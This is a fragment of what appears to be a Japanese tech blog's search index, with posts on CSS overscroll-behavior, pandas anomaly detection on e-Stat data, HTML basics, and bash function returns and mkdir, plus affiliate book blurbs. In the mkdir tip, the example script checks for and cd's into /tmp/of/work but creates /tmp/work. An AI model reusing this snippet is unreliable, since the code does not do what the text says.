シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-17T10:51:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-17-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-17-01-ani/","title":"s-Stat 時系列データで異常値を検知しよう（２）"},{"content":"出典元： Prevent Scroll Chaining With Overscroll Behavior - Ahmad Shadeed position: fixedの要素があるとしましょう。スクロールがある場合は、要素の下部の境界に到達すると、ブラウザはbody要素をスクロールし続けることに気付くでしょう。これは望ましくない混乱を招く効果です。ありがたいことに、CSSで修正できます。 この記事では、overscroll-behavior CSSプロパティ、それが解決する問題、その仕組み、および使用場所について説明します。\nはじめに 非常に一般的な問題を取り上げましょう。ビューポートの中央に配置されたモーダルダイアログがあります。そのモーダルの下に、実際のWebページのコンテンツがあります。\nモーダルコンテンツの最後に到達すると、ブラウザは代わりにメインページのコンテンツをスクロールし続けます。これはスクロールチェーンと呼ばれます。これはデフォルトの動作であり、overscroll-behaviorという新しいCSSプロパティでオーバーライドできるようになりました。\n多くの場合、この動作は不要であり、ユーザーがモーダルコンテンツに集中できなくなる可能性があります。上の図では、モーダルの最後に到達したときに、ページがスクロールし続けていることに注目してください。\n無理やり対応する 以前は、javascriptを介してbody要素にoverflow: hiddenを適用することでこれを修正していました。モーダルが開かれると、オーバーフローの適用を担当するクラスが本体に追加されます。\nbody.modal-open { overflow: hidden; } .modal.is-open { display: block; } このやり方は、以前はデスクトップブラウザ間で完全に機能していましたが、iOS上のSafariでは動作しませんでした。これを機能させるには、body要素にposition: fixedを追加する必要もあります。\nbody.modal-open { position: fixed; overflow: hidden; } .modal.is-open { display: block; } これは機能しますが、ブラウザが一番上までスクロールし、ユーザーが手元のタスクから気をそらしてしまいます。これは、他の問題を引き起こす修正です。\nベン・フレインによる 記事 に固定されたものを除いて、私はその解決策を知りません。 ベンの記事のスニペットによると、モーダルがアクティブになったら、\u0026lt;body\u0026gt;要素に以下を追加する必要があります。\n.bg-scrolling-element-when-modal-active { /* when modal active */ touch-action: none; -webkit-overflow-scrolling: none; overflow: hidden; /* Other browsers */ overscroll-behavior: none; } 2018年にクライアントプロジェクトに取り組んだことを覚えています。そこでは、iOSのモバイルメニューの本文のスクロールを防ぐことはできないと彼に話しました。\n彼は：\nプログラミングで不可能なことは何もありません。解決策があると確信している。\nといっていました。\n「プログラミング？」と思うかもしれませんが、それはCSSを指します。多くのことを試して、研究し続けましたが、完璧な解決策はありませんでした。\nそれでは時間を遡って、overscroll-behaviorをソリューションに紹介したいと思います。\noverscroll-behaviorについて overscroll-behaviorプロパティは、スクロール領域の境界に到達したときにブラウザが実行する処理を設定します。 Safariを除くすべての主要なブラウザで[サポートされています。プロパティは、overscroll-behavior-xおよびoverscroll-behavior-yの省略形です。 overscroll-behaviorを設定すると、両方の軸が設定されることに注意してください。\n設定可能な値を見てみましょう。\noverscroll-behavior: auto デフォルト値は auto で、これによりスクロールチェーンが可能になります。スクロール要素があり、その境界に達すると、ブラウザは\u0026lt;body\u0026gt;コンテンツをスクロールし続けます。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. overscroll-behavior: contain その名前から、値containには、要素の境界内にスクロールが含まれます。次の図では、スクロールは青い輪郭のラッパー内に含まれています。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. overscroll-behavior: none noneを設定すると、 contains と同様の効果があり、 さらに ページの上部または下部に達したときのバウンス効果を防ぎます。\nユースケースと例 overscroll-behavior がどのように機能するかがわかったところで、いくつかの便利なユースケースを見てみましょう。\nモバイルナビゲーション モバイルナビゲーションが長すぎる場合、スクロールが速すぎると、本文のコンテンツでスクロールチェーンの問題が発生する可能性があります。\n次の図には、スクロール可能な長いナビゲーションリストがあります。\nスクロールが含まれていない場合は、本文のコンテンツもスクロールします。それを避けることができます\n.nav { overscroll-behavior-y: contain; overflow-y: auto; } 動画で見てみましょう。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. ナビゲーションの下に表示される半透明の背景を追加しました。 overscroll-behavior-yプロパティをオフに切り替えたときの動作に注意してください。\nオフに切り替えると、ボディスクロールが発生します。\nただし、ナビゲーションが短く（つまり、スクロールできない）、ユーザーが理由もなくスクロールしようとすると、overscroll-behavior-y: containであっても、本文がスクロールすることに注意してください。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. 残念ながら、記事の冒頭で紹介した「無理やり対応」以外の修正方法はわかりません。\nサイドナビゲーション overscroll-behavior のもう1つの便利な使用法は、サイドバーとメインがある場合です。その場合、サイドバーは固定されており、コンテンツが長すぎるとスクロール可能になる可能性があります。\nサイドバーの端の境界に達したときにメインセクションがスクロールしないようにするには、次を追加する必要があります。\n.aside { overscroll-behavior-y: contain; } チャットコンポーネント Facebookに触発されたチャットコンポーネントは、 overscroll-behavior の完璧なユースケースです。これを使用して、最後に到達したときにボディがスクロールしないようにできます。\n.aside { overscroll-behavior-y: contain; } モーダルコンテンツ 記事内で最初に行った例はモーダルなので、繰り返しません。ただし、モーダル内にリストが必要な場合があり、そのリストがスクロール可能である場合は、スクロールチェーンを発生させたくありません。\nモーダルのオプションのリストに注意してください。これはスクロール可能なリストです。その境界に達すると、モーダルコンテンツがスクロールします。これを回避するには、 overscroll-behavior を使用します。\n.list-wrapper { overscroll-behavior-y: contain; overflow-y: auto; max-height: 130px; } 水平リスト Facebookのホームページでこのユースケースを見つけました。ユーザーのリストがあるセクションがあり、次の図に示すように水平方向にスクロールします。\nこれはoverscroll-behavior-xのベストな使い方です。\n.list { overscroll-behavior-x: contain; } まとめ CSS overscroll-behavior は、何年も前に無理やり対応していた問題を解決する便利なプロパティです。\nオススメの書籍 ざっくりつかむ　CSS設計[リフロー版] Web制作の現場でこれだけは知っておきたい、CSSの扱い方、管理、運用の基本！ Web開発が複雑化した現在、CSSについても仕様や知識を知っているだけでは対応できない問題が増えています。\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\nプロの「引き出し」を増やす　HTML\u0026#43;CSSコーディングの強化書 HTML・CSSの基本は覚えたけれど、デザインカンプから情報を読み取って、イチからコーディングするのはまだ無理……。 初心者を脱して、コーダー／マークアップエンジニアとして制作現場でバリバリ活躍する力をつけたい。 本書はそんな方に向けたものです。\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n","date":"2022-01-15T12:16:02+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro_hu24c71efb47487f1e866b5cfa9cf10000_52262_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/","title":"overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止"},{"content":"s-Stat 時系列データで異常値を検知しよう たくさんあるデータの中から関心の高そうな項目を抽出して表示しようというテーマでe-Statデータを取り扱っています。\n関心の高そうな項目としては、キーワードが重要というのもあります。これは前回で取り扱ったテーマでgoogle検索などを利用してピックアップしてこうかなと考えております。\nそのほか、値が急上昇、急下降したような場合も関心が高い項目と言えそうです。\n今回は、データの中から値が急上昇、急下降した場合を抽出する方法を考えて行きたいと思います。\nwebで検索した感じだと今回やりたいことは、時系列データの異常値を検知するというものみたいです。\n方法を色々調べてみたのですがpython のhampel を使うのが簡単そうです。\ne-Statのapiを取得したcsvを利用しますので、まずpythonでcsvを取り扱う方法から調べる必要があります。\npython でcsvを取り扱う 今回は、pandasを利用することになるのでpandasでcsvを読み込むことにします。\n課題としては、商品の小売価格の変動が分かりやすいので「小売物価統計調査 小売物価統計調査（動向編） 」から札幌市のコシヒカリの値段を抜粋してcsvを作成したいと思います。\nwget \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxx\u0026amp;lang=J\u0026amp;statsDataId=0003421913\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; -O kouri.csv cat kouri.csv |grep \u0026#34;札幌市\u0026#34;|grep \u0026#34;1001 うるち米(単一原料米,「コシヒカリ」)\u0026#34;|awk -F, \u0026#39;{print $10\u0026#34;,\u0026#34;$13;}\u0026#39;|sed -e \u0026#34;s|\\\u0026#34;||g\u0026#34;|sort -n \u0026gt;kome.csv 2002000101,2483 2002000202,2483 2002000303,2480 2002000404,2520 2002000505,2573 2002000606,2520 2002000707,2431 2002000808,2404 こんな感じで年月と値段の２列のcsvになりました。\npythonのソースコードは以下の通り\nimport matplotlib.pyplot as plt import pandas as pd from hampel import hampel df = pd.read_csv(\u0026#39;./kome.csv\u0026#39;) print(df) 2002000101 2483 0 2002000202 2483 1 2002000303 2480 2 2002000404 2520 3 2002000505 2573 4 2002000606 2520 .. ... ... 233 2021000707 2470 234 2021000808 2443 デリミタが「,」の時はdelimiter=\u0026quot;;\u0026ldquo;みたく第２引数で指定する必要はないみたいです。\ncsvの読み込み方はいろんなサイトに書かれているのですが、読み込んだcsvを操作する方法についてはすぐ出てこなかったので次回はpandasで読み込んだcsvを操作する方法を取り扱いと思います。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-14T13:40:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-01-ani/","title":"s-Stat 時系列データで異常値を検知しよう（１）"},{"content":"はじめに HTMLをこれから始める人、HTMLってプログラムみたいで難しそうと思っている人、HTMLで挫折してしまった人。そういった人たちでもHTMLがわかるようになってほしいと思って「現役Webデザイナーが教えるHTML初心者講座」を始めてみました。\nまずは簡単にタグを覚える方法を紹介します。\nHTMLってなに？ HTMLとは（Hypertext Markup Language、ハイパーテキスト・マークアップ・ランゲージ）と呼ばれる言語のことで、書き方でタイトルや文章、箇条書き、画像の挿入ができたりします。\nたとえば\n\u0026lt;h1\u0026gt;タイトル\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;文章\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;リンク\u0026lt;/a\u0026gt; という内容であればヘッドラインと文章とリンクになります。\n他のプログラムのようにHTML自体で何かを動かすということはできませんが、Web上でなにか公開すると、HTMLを使う必要が出てきます。\nタグを覚えよう HTMLにはタグと呼ばれるものがあり、それぞれ意味を持っています。\n「たくさんあって覚えられないよ」という人もいるかと思います。HTMLは覚えたらそれがすべてというわけではなく、年々更新されて、知らないようなタグが出てきたりします。\nとはいっても、基本的なタグは変わりません。\nここでは基本的なタグを覚えてみましょう。\n覚え方はすごく簡単です。英語にしたときの頭文字だと思っておけば9割は覚えられました。\n残りの1割程度は頭文字ではなく、単語の確率が高いです。\nこれでHTMLのタグはほぼほぼ覚えられました。\n他の言語と違って、すごく簡単だと思いませんか？\nそれでは主要なタグを見てみましょう。\nヘッドライン \u0026lt;h1\u0026gt; \u0026lt;h2\u0026gt; \u0026lt;h3\u0026gt; \u0026lt;h4\u0026gt; \u0026lt;h5\u0026gt; \u0026lt;h6\u0026gt; Headline（見出し）の頭文字hを使ったタグです。\n文章を書く上で大事なのがhタグです。h1からh6まであります。\nh1は最上位の見出しタグで、基本的にはサイト内に1つしか存在してはならないとされてます。\nそのページのいちばん大事なタイトル部分にh1を設定する事が多いです。\nh2は大見出し的な扱いです。h1よりも重要度は下がってきます。\nh3は小見出し的な扱いです。\nそして、h4、 h5、h6となっていきます。\n文章 \u0026lt;p\u0026gt; Paragraph（文章）の頭文字で、文章を表すタグが\u0026lt;p\u0026gt;です。\n\u0026lt;p\u0026gt;今日はいい天気だ。\u0026lt;/p\u0026gt; とすることで、1つの文章になります。\n段落を構成したい場合は、\n\u0026lt;p\u0026gt;今日はいい天気だ。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;洗濯物もよく乾く。\u0026lt;/p\u0026gt; と\u0026lt;p\u0026gt;を続けて書いてやれば大丈夫です。\n改行 \u0026lt;br\u0026gt; さきほどの文章内で改行したいとなったときはBreak（壊す）の\u0026lt;br\u0026gt;を使ってみましょう。\n「いい天気だ」の「いい」という部分で改行したい場合は\n\u0026lt;p\u0026gt;今日は\u0026lt;br\u0026gt;いい天気だ。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;洗濯物もよく乾く。\u0026lt;/p\u0026gt; とすることで改行がされます。\nリンク \u0026lt;a\u0026gt; 次に、リンクを張りたい場合は、Anchor（いかり）のリンクの出発点や到達点を指定するタグ\u0026lt;a\u0026gt;を使いましょう。\n\u0026lt;a\u0026gt;タグは今までのタグと少し違い、属性と呼ばれる文字を追記する必要があります。\nたとえば、googleにリンクを張りたいと思ったときは\n\u0026lt;a\u0026gt;リンクだよ\u0026lt;/a\u0026gt; とするのではなく、\n\u0026lt;a href=\u0026#34;https://google.com/\u0026#34;\u0026gt;リンクだよ\u0026lt;/a\u0026gt; とする必要があります。\nこのhrefは「hypertext reference」の略です。日本語訳すると「参照」とかになるのでしょうか。\nhref部分にはリンクしたいサイトのURLを貼り付けて、囲んだタグの中には表示したい文字列を入力します。\n画像 \u0026lt;img\u0026gt; Image（画像）はHTMLでも\u0026lt;img\u0026gt;となってます。\nこのタグも前回のリンクと同じように属性が必要です。\n画像に必要な属性はsrcとaltになります。\nsrcは「source（元）」の略で、画像のURLを入力します。\naltは「alternate」の略です。日本語では「代替」となります。画像が何らかの原因で表示できなかったり、目の不自由な方に対して、その画像がどういったものなのかを記述することで、画像を表現できます。\n箱的なもの \u0026lt;div\u0026gt; divはちょっと厄介で、今まで出てきたタグのように意味を持っていません。\nしかし、このタグで囲ったものをグループとして機能させるようにできます。\ndivideやdivisionの略で、分割するという意味になります。\nたとえば、サイトを3つの構成に分けたいとしましょう。\nその場合は、\n\u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;コンテンツ1\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;コンテンツ2\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;コンテンツ3\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; などとすることが可能です。\nリスト \u0026lt;ul\u0026gt; \u0026lt;ol\u0026gt; リスト形式の文章を作りたいときには\u0026lt;ul\u0026gt;や\u0026lt;ol\u0026gt;を使用します。\nulは「unordered list」の略で、順序がないリストと言う意味です。\nolは「order list」の略で、順序があるリストと言う意味ですね。\nulやolの中には\u0026lt;li\u0026gt;というタグを記述します。\nこれは「list」を意味するタグです。\n\u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;リスト1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;リスト2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;リスト3\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;リスト1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;リスト2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;リスト3\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; ulとolの違いは、ulの場合はliの頭に「・」が付き、olの場合は「数字」が付きます。\n以上が比較的よく使うHTMLタグになります。\nまとめ すごく簡単でしたが、HTMLのタグの説明になります。\nタグが多くて難しいと感じている方は、やりたいことを英語にしたときになんていうのかということを考えれば、HTMLタグに置き換えることができるのではないかと思います。\nたとえば、文章を強調したいなと思ったとしたら、強調は強くしたいってことだから「strong」だよな。となります。\nそして、HTMLには\u0026lt;strong\u0026gt;という強調のためのタグが存在しています。\nまた、ここは関係ないところだなというのは、脇に追いやっておきたいので、\u0026lt;aside\u0026gt;というタグを使うことが可能です。\nこのように、HTMLタグは自分がやりたいとを英語にしたときになんて言うのかさえわかってしまえば簡単に記述することが可能です。\nオススメの書籍 【Amazon.co.jp 限定】1冊ですべて身につくHTML \u0026amp; CSSとWebデザイン入門講座 (DL特典: CSS Flexbox チートシート) Web界隈やデザイナーに大人気! Web関連の情報やデザインについて記事が学べる『Webクリエイターボックス』の管理人、 Manaによる渾身のHTML \u0026amp; CSSとWebデザインが学べる本\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 これだけで基本がしっかり身につく HTML/CSS\u0026amp;Webデザイン1冊目の本 Webサイト制作をこれから学ぶ人へ送る “1冊目\u0026#34;に最適の入門書! 【学びをサポートする4大特典つき】 本書は手を動かしてWebサイトを作りながら\nHTML/CSSとWebデザインの基本を楽しく学べる入門書です。\n初学者が1冊目に読む本としてふさわしい内容を盛り込んでいるため、\nこれを読めば必要な基礎知識がひととおり身につきます。\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n","date":"2022-01-13T14:14:30+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-13-01-wyoshi/image_hub0ad8d9b7843596d0a4360bbec01c5d1_56986_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-13-01-wyoshi/","title":"現役Webデザイナーが解説する初めてのHTML初心者講座"},{"content":"関数からの戻り値の受け渡し 関数からの戻り値の受け渡し：\nBash関数は、数値と文字列値の両方を渡すことができます。関数から文字列値を渡す方法を次の例に示します。\u0026lsquo;function_return.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。関数greeting（）は、文字列値を変数valに返します。この変数は、処理の最後に他の文字列と組み合わせて出力します。\n#!/bin/bash function greeting(){ str=\u0026#34;こんにちは、$name\u0026#34;; echo \u0026#34;$str\u0026#34;; } echo \u0026#34;あなたの名前を入力して下さい\u0026#34;; read name; val=$(greeting); echo \u0026#34;関数からの戻り値は「${val}」です。\u0026#34;; bashコマンドでファイルを実行します。\n$ bash function_return.sh あなたの名前を入力して下さい suzuki 関数からの戻り値は「こんにちは、suzuki」です。 $ 戻り値について bashシェルスクリプトには「戻り値」というものは基本的に存在しない。 解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。\n「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-13T11:26:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-20-suzuki/","title":"【２０．スクリプトからの戻り値を渡す】ざっくりわかる「シェルスクリプト」"},{"content":"ディレクトリを作成する ディレクトリを作成する：\nBashは「mkdir」コマンドを使用して新しいディレクトリを作成します。\u0026lsquo;make_directory.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加して、ユーザーから新しいディレクトリ名を取得します。ディレクトリ名が現在の場所に存在しない場合は、ディレクトリが作成されます。\n#!/bin/bash echo \u0026#34;ディレクトリ名を入力して下さい。\u0026#34; read newdir `mkdir \u0026#34;$newdir\u0026#34;` bashコマンドでファイルを実行します。\n$ bash make_directory.sh ディレクトリ名を入力して下さい。 suzuki $ ls suzuki/ ヒント よく記述していたのは以下のようなコードでした。 事前にディレクトリの存在チェックを行い、見つからなかった場合のみディレクトリを作成します。 #!/bin/bash if [ -d \u0026#34;/tmp/of/work\u0026#34; ];then : # 何もしない else mkdir -p \u0026#34;/tmp/work\u0026#34;; fi cd \u0026#34;/tmp/of/work\u0026#34;; ヒント 実はディレクトリの存在チェックを行わなくても先のスクリプトは問題なく動作します。 mkdir -p コマンドは以下のような挙動をします。 作成対象ディレクトリの親ディレクトリが存在しない場合 はすべての親ディレクトリを作成する\n作成対象ディレクトリがすでに存在している場合 は何も行わず、エラーもはかない #!/bin/bash # 一旦ディレクトリを作成 mkdir -p /tmp/work ls -l -d /tmp/work/ # 出力 # drwxr-xr-x 2 root root 64 Aug 22 08:26 /tmp/work/ # オプション無しですでに存在しているディレクトリを作成 mkdir /tmp/work # 出力 # mkdir: /tmp/work: File exists echo $? # 1 # -pオプション有りだとエラーを吐かない mkdir -p /tmp/work echo $? # 0 $ bash bash drwxr-xr-x 2 suzukiiichiro wheel 64 1 21 13:13 /tmp/work/ mkdir: /tmp/work: File exists 1 0 bash-5.1$ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 